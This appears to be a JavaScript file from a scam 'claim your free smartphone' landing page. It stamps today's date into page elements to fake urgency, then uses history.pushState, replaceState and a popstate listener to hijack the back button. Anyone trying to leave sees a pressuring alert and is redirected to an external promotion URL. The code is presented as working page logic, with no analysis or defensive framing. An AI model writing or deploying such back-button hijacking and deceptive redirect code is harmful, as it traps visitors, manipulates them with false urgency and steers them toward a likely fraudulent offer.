var date_elements = document.querySelectorAll('[data-date-element]');

function GetToday(offset) {
    offset = typeof offset !== 'undefined' ? offset : 0;

    // Array of day names
    var dayNames = new Array("Sunday", "Monday", "Tuesday", "Wednesday",

        "Thursday", "Friday", "Saturday");

    // Array of month Names
    var monthNames = new Array(
        "January", "February", "March", "April", "May", "June", "July",

        "August", "September", "October", "November", "December");
    var now = new Date();

    now.setDate(now.getDate() + parseInt(offset));

    return dayNames[now.getDay()] + ", " +
        (now.getDate()) + " " +
        monthNames[now.getMonth()] + " " +
        now.getFullYear();
}

for (i = 0; i < date_elements.length; i++) {
    var dateText = document.createTextNode(GetToday());
    date_elements[i].appendChild(dateText);
}

var alertMsg = "ARE YOU GIVING THIS OPPORTUNITY TO THE NEXT PERSON IN LINE? \n\nCLICK ON 'STAY ON THIS PAGE' RIGHT NOW TO GO TO THIS PROMOTION \n\nCLAIM YOUR SMARTPHONE NOW BEFORE IT'S TOO LATE!";
var url = "https://realhappiness.online/?flux_action=2";

(function(window, location) {
    history.replaceState(null, document.title, location.pathname+"#!/history");
    history.pushState(null, document.title, location.pathname);

    window.addEventListener("popstate", function() {
        if(location.hash === "#!/history") {
            history.replaceState(null, document.title, location.pathname);
            setTimeout(function(){
                alert(alertMsg);
                location.replace(url);
            },0);
        }
    }, false);
}(window, location));